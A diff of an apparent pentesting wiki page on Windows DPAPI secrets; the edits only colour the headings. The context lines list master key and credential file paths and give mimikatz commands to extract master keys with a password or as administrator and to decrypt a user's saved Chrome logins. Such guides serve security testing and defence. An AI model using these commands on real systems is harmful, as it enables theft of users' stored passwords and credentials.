@@ -1,6 +1,6 @@
 # DPAPI secrets
 
-## DPAPI
+## <mark style="color:red;">DPAPI</mark>
 
 The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:
 
@@ -31,7 +31,7 @@ C:\Users\$USER\AppData\Local\Microsoft\Credentials\
 C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
 ```
 
-## Extract a master key
+## <mark style="color:red;">Extract a master key</mark>
 
 f you know the password of the user who the master key belongs to and you can access the master key file you can obtain the master key with mimikatz and a command like the following one:
 
@@ -39,7 +39,7 @@ f you know the password of the user who the master key belongs to and you can ac
 dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected
 ```
 
-### Extract all local Master Keys with Administrator <a href="#extract-all-local-master-keys-with-administrator" id="extract-all-local-master-keys-with-administrator"></a>
+### <mark style="color:orange;">Extract all local Master Keys with Administrator</mark> <a href="#extract-all-local-master-keys-with-administrator" id="extract-all-local-master-keys-with-administrator"></a>
 
 If you are administrator you can obtain the dpapi master keys using:
 
@@ -47,7 +47,7 @@ If you are administrator you can obtain the dpapi master keys using:
 sekurlsa::dpapi
 ```
 
-### Extract all backup Master Keys with Domain Admin <a href="#extract-all-backup-master-keys-with-domain-admin" id="extract-all-backup-master-keys-with-domain-admin"></a>
+### <mark style="color:orange;">Extract all backup Master Keys with Domain Admin</mark> <a href="#extract-all-backup-master-keys-with-domain-admin" id="extract-all-backup-master-keys-with-domain-admin"></a>
 
 A domain admin may obtain the backup dpapi master keys that can be used to decrypt the encrypted keys:
 
@@ -67,7 +67,7 @@ We can now decrypt user's `spotless` chrome secrets using their decrypted master
 dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
 ```
 
-### Credential Files
+### <mark style="color:red;">Credential Files</mark>
 
 The **credentials files protected by the master password** could be located in:
 
